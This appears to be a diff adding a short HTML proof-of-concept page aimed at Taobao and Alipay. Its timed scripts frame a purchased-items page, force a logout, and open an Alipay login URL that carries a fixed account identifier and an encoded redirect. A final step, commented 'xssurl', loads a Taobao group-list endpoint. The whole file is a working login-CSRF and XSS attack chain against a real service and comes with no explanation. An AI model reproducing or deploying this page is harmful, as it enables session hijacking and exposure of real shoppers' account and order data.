@@ -1,0 +1,14 @@
+<html>
+  <body>
+
+  	<iframe id="1" src="https://buyertrade.taobao.com/trade/itemlist/list_bought_items.htm"></iframe>
+
+    <script>
+    	setTimeout("var s=document.createElement('img');document.body.appendChild(s);s.src='https://login.taobao.com/member/logout.jhtml'",1000)//logout
+
+		setTimeout('open("https://auth.alipay.com/aso/tgs?domain=taobao&sign_account=20885324866733120156%5E13762119261&target=68747470733A2F2F6C6F67696E2E74616F62616F2E636F6D2F6D656D6265722F616C697061795F7369676E5F646973706174636865722E6A68746D6C3F74673D68747470253341253246253246692E74616F62616F2E636F6D2532466D795F74616F62616F2E68746D25334673706D253344312E373135363437342E3735343839343433372E312E706A36566276253236706D5F69642533443135303130333630303061303263356333373339&defaultLoginURL=")',2000);//login
+
+		setTimeout("var d=document.createElement('iframe');document.body.appendChild(d);d.src='https://xiangqing.wangpu.taobao.com/mygroup/ajax/GetGroupList.do?_input_charset=utf-8&groupType=0&pageSize=8&currentPage=1';d.id='2'",10000)//xssurl
+	</script>
+  </body>
+</html>
